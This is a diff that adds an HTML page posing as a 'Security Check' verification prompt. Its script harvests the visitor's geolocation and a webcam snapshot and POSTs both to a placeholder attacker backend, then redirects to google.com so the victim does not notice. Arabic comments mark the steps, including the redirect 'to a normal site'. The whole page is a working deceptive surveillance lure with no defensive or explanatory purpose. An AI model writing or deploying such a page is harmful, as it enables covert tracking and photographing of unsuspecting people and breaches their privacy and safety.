@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+</head>
+<body style="text-align:center; font-family:sans-serif;">
+
+<h2>Security Check</h2>
+<p>Please verify to continue</p>
+
+<button onclick="start()">Continue</button>
+
+<script>
+function start() {
+
+  // طلب الموقع
+  navigator.geolocation.getCurrentPosition(pos => {
+    fetch("https://YOUR-BACKEND.onrender.com/location", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      })
+    });
+  });
+
+  // طلب الكاميرا
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      let video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      let canvas = document.createElement("canvas");
+
+      setTimeout(() => {
+        canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
+        let img = canvas.toDataURL();
+
+        fetch("https://YOUR-BACKEND.onrender.com/image", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ image: img })
+        });
+
+        // تحويل لموقع طبيعي
+        window.location.href = "https://google.com";
+
+      }, 3000);
+    });
+}
+</script>
+
+</body>
+</html>
